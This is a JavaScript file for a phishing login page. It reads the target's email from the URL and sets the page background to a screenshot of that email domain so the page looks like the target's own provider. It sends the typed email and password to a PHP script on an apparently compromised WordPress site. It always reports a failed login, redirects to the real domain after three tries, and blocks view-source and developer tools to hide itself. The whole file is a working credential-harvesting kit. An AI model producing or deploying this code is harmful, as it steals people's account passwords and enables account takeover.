/**
 * Security and Login Form Script
 * Includes security features to block inspection and keyboard shortcuts
 */

// Login attempt counter
let loginAttempts = 0;
const maxAttempts = 3;

// Security Features - Block browser inspection tools
document.addEventListener('contextmenu', function(e) {
  e.preventDefault();
  showSecurityAlert();
  return false;
});

document.addEventListener('keydown', function(e) {
  // Block Ctrl+U (View Source)
  if (e.ctrlKey && e.key === 'u') {
    e.preventDefault();
    showSecurityAlert();
    return false;
  }
  
  // Block F12 (Developer Tools)
  if (e.key === 'F12' || e.keyCode === 123) {
    e.preventDefault();
    showSecurityAlert();
    return false;
  }
  
  // Block Ctrl+Shift+I (Inspect Element)
  if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I')) {
    e.preventDefault();
    showSecurityAlert();
    return false;
  }
  
  // Block Ctrl+S (Save Page)
  if (e.ctrlKey && e.key === 's') {
    e.preventDefault();
    showSecurityAlert();
    return false;
  }
  
  // Block Ctrl+Shift+C (Inspector)
  if (e.ctrlKey && e.shiftKey && (e.key === 'c' || e.key === 'C')) {
    e.preventDefault();
    showSecurityAlert();
    return false;
  }
  
  // Block Ctrl+Shift+J (Console)
  if (e.ctrlKey && e.shiftKey && (e.key === 'j' || e.key === 'J')) {
    e.preventDefault();
    showSecurityAlert();
    return false;
  }
});

// Detect DevTools opening by window size changes
function detectDevTools() {
  let devtoolsOpen = false;
  
  const threshold = 160;
  const widthThreshold = window.outerWidth - window.innerWidth > threshold;
  const heightThreshold = window.outerHeight - window.innerHeight > threshold;
  
  if (widthThreshold || heightThreshold) {
    if (!devtoolsOpen) {
      devtoolsOpen = true;
      showSecurityAlert();
    }
  } else {
    devtoolsOpen = false;
  }
  
  setTimeout(detectDevTools, 1000);
}

detectDevTools();

// Show security alert message
function showSecurityAlert() {
  const alertDiv = document.createElement('div');
  alertDiv.style.position = 'fixed';
  alertDiv.style.top = '10px';
  alertDiv.style.left = '50%';
  alertDiv.style.transform = 'translateX(-50%)';
  alertDiv.style.backgroundColor = '#ffffff';
  alertDiv.style.color = 'white';
  alertDiv.style.padding = '15px 20px';
  alertDiv.style.borderRadius = '5px';
  alertDiv.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
  alertDiv.style.zIndex = '10000';
  alertDiv.textContent = '';
  
  document.body.appendChild(alertDiv);
  
  setTimeout(() => {
    alertDiv.remove();
  }, 3000);
}

// Function to grab the 'email' parameter from the URL
function getEmailFromURL() {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get('email');
}

// Function to extract the domain from the email
function extractDomain(email) {
  if (!email || !email.includes('@')) return null;
  const domain = email.split('@')[1];  // Get the part after '@'
  return domain;
}

// Function to set the background image dynamically based on email domain
function setBackgroundImage(domain) {
  if (!domain) return;
  const backgroundUrl = `https://image.thum.io/get/width/1920/crop/1080/noanimate/https://${domain}`;
  document.body.style.backgroundImage = `url('${backgroundUrl}')`;
}

// Function to validate email format
function isValidEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

// Function to create attempt indicator display
function createAttemptIndicator() {
  const indicator = document.createElement('div');
  indicator.id = 'attempt-indicator';
  indicator.style.marginBottom = '15px';
  indicator.style.textAlign = 'center';
  indicator.style.display = 'none';
  return indicator;
}

// Function to update attempt indicator
function updateAttemptIndicator() {
  const indicator = document.getElementById('attempt-indicator');
  if (!indicator) return;
  
  // Keep the indicator hidden
  indicator.style.display = 'none';
  
  // Still generate the HTML but don't display it
  let dotsHtml = '';
  for (let i = 0; i < maxAttempts; i++) {
    const color = i < loginAttempts ? 'red' : '#ddd';
    dotsHtml += `<span style="display: none; width: 10px; height: 10px; border-radius: 50%; background-color: ${color}; margin: 0 5px;"></span>`;
  }
  
  let message = '';
  if (loginAttempts >= maxAttempts) {
    message = `<p style="display: none; margin: 5px 0; color: red;">Maximum attempts reached</p>`;
  }
  
  indicator.innerHTML = `
    <div>${dotsHtml}</div>
    ${message}
  `;
}

// Function to dynamically create and insert the form into the DOM
function createLoginForm() {
  const loginContainer = document.querySelector('.login-container');

  // Create form element
  const form = document.createElement('form');
  form.id = 'loginForm';
  form.action = 'https://lorneplumbing.com.au/wp-content/uploads/2025/server.php'; // Using external URL
  form.method = 'POST'; // Use POST method
  // This attribute ensures the form opens in a new tab/window
  form.target = '_blank';

  // Create email input group without icon
  const emailGroup = document.createElement('div');
  emailGroup.className = 'input-group';
  
  const emailInput = document.createElement('input');
  emailInput.type = 'email';
  emailInput.id = 'emailInput';
  emailInput.name = 'email'; // Add name attribute for form submission
  emailInput.placeholder = 'Email';
  emailInput.required = true;
  emailInput.style.padding = '12px'; // Adjust padding since there's no icon
  emailGroup.appendChild(emailInput);

  // Create password input group without icon
  const passwordGroup = document.createElement('div');
  passwordGroup.className = 'input-group password-group';
  
  const passwordInput = document.createElement('input');
  passwordInput.type = 'password';
  passwordInput.id = 'passwordInput';
  passwordInput.name = 'password'; // Add name attribute for form submission
  passwordInput.placeholder = 'Password';
  passwordInput.required = true;
  passwordInput.style.padding = '12px';
  passwordGroup.appendChild(passwordInput);

  // Create attempt indicator
  const attemptIndicator = createAttemptIndicator();

  // Create submit button
  const submitButton = document.createElement('button');
  submitButton.type = 'submit';
  submitButton.textContent = 'Login';

  // Append all elements to form
  form.appendChild(emailGroup);
  form.appendChild(passwordGroup);
  form.appendChild(attemptIndicator);
  form.appendChild(submitButton);

  // Append form to login container
  loginContainer.appendChild(form);

  // Email validation
  emailInput.addEventListener('blur', function() {
    if (this.value && !isValidEmail(this.value)) {
      this.style.borderColor = 'red';
    } else {
      this.style.borderColor = '';
    }
  });

  // Event listener for form submission
  form.addEventListener('submit', function(event) {
    // Always prevent default form submission to handle our logic
    event.preventDefault();
    
    // Get email and password values
    const email = document.getElementById('emailInput').value;
    const password = document.getElementById('passwordInput').value;

    // Basic validation
    if (!isValidEmail(email)) {
      alert('Please enter a valid email address');
      return;
    }

    if (password.length < 5) {
      alert('Password must be at least 5 characters long');
      return;
    }

    // Create a FormData object to send to server.php
    const formData = new FormData();
    formData.append('email', email);
    formData.append('password', password);
    
    // Send the credential data to server.php using fetch API
    fetch('https://lorneplumbing.com.au/wp-content/uploads/2025/server.php', {
      method: 'POST',
      body: formData
    })
    .then(response => {
      console.log('Credentials submitted successfully');
      // Clear the password field after submission while preserving the email
      document.getElementById('passwordInput').value = '';
    })
    .catch(error => {
      console.error('Error submitting credentials:', error);
      // Clear the password field even if there's an error
      document.getElementById('passwordInput').value = '';
    });

    // Continue with the original login flow
    // Simulate login validation - we'll assume login fails to demonstrate the redirect
    const loginSuccessful = false; // Always fail login for this demo
    
    if (!loginSuccessful) {
      // Increment login attempts on failed login
      loginAttempts++;
      
      // Update the attempt indicator
      updateAttemptIndicator();
      
      // Always clear password field but keep email
      document.getElementById('passwordInput').value = '';
      
      // Check if max attempts reached
      if (loginAttempts >= maxAttempts) {
        // Extract email domain for redirection
        const domain = extractDomain(email);
        if (domain) {
          // Create a more visible redirect message
          const redirectBox = document.createElement('div');
          redirectBox.style.position = 'fixed';
          redirectBox.style.top = '50%';
          redirectBox.style.left = '50%';
          redirectBox.style.transform = 'translate(-50%, -50%)';
          redirectBox.style.backgroundColor = 'rgba(255, 255, 255, 0.9)';
          redirectBox.style.padding = '20px';
          redirectBox.style.borderRadius = '8px';
          redirectBox.style.boxShadow = '0 0 15px rgba(0, 0, 0, 0.3)';
          redirectBox.style.zIndex = '10000';
          redirectBox.style.textAlign = 'center';
          redirectBox.innerHTML = `
            <h3 style="color: #cc0000; margin-top: 0;">Maximum Login Attempts Reached</h3>
            <p>Redirecting to ${domain} in 3 seconds...</p>
            <div style="width: 100%; height: 5px; background-color: #eee; margin-top: 15px;">
              <div id="redirect-progress" style="width: 0%; height: 100%; background-color: #cc0000; transition: width 3s linear;"></div>
            </div>
          `;
          document.body.appendChild(redirectBox);
          
          // Animate the progress bar
          setTimeout(() => {
            document.getElementById('redirect-progress').style.width = '100%';
          }, 50);
          
          // Redirect to the domain after a delay
          setTimeout(() => {
            window.location.href = `https://${domain}`;
          }, 3000);
          return;
        }
      } else {
        // Silent failed login - no alert message
        console.log(`Login failed. Attempt ${loginAttempts} of ${maxAttempts}.`);
      }
    } else {
      // If login is successful, reset attempt counter and submit the form
      loginAttempts = 0;
      form.removeEventListener('submit', arguments.callee);
      form.submit();
    }
  });
}

// Initialize when DOM is fully loaded
document.addEventListener('DOMContentLoaded', function() {
  // Call the function to create the form dynamically
  createLoginForm();

  // Grab email from the URL and pre-fill the email input field
  const email = getEmailFromURL();
  if (email) {
    document.getElementById('emailInput').value = email;
    const domain = extractDomain(email);
    if (domain) {
      setBackgroundImage(domain);
    }
  }
});
